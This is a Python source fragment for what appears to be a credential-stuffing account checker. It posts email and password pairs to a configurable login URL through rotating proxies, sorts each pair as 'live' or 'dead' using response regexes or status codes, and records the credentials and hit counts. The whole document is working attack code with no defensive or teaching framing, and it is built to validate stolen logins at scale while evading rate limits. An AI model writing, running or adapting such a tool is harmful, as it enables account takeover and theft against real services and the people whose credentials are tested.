import asyncio, re, httpx

async def validate(job, target):
    sem = asyncio.Semaphore(target.get("concurrency", 10))
    ok_re = re.compile(target["success_regex"]) if target.get("success_regex") else None
    bad_re = re.compile(target["fail_regex"]) if target.get("fail_regex") else None
    proxies = target.get("proxy_list") or [None]
    counter = {"i": 0}

    async with httpx.AsyncClient(follow_redirects=True, timeout=20) as client:
        async def one(email, pw):
            async with sem:
                proxy = proxies[counter["i"] % len(proxies)]
                counter["i"] += 1
                body = target["body"].replace("{email}", email).replace("{pass}", pw)
                try:
                    r = await client.request(
                        target.get("method", "POST"), target["url"],
                        content=body, headers=target.get("headers") or {}, proxy=proxy,
                    )
                    text = r.text
                    verdict = "unknown"
                    if ok_re and ok_re.search(text):
                        verdict = "live"
                    elif bad_re and bad_re.search(text):
                        verdict = "dead"
                    elif bad_re is None and ok_re is None:
                        verdict = "live" if r.status_code in (200, 302) else "dead"
                except Exception:
                    verdict = "error"
                return verdict

        for email, pw in job.pairs:
            verdict = await one(email, pw)
            job.done += 1
            if verdict == "live":
                job.hits += 1
            job.row(email, pw, verdict)
            if job.done % 50 == 0:
                job.emit("progress", done=job.done, total=job.total, hits=job.hits)
                await asyncio.sleep(0)
    job.close("finished")
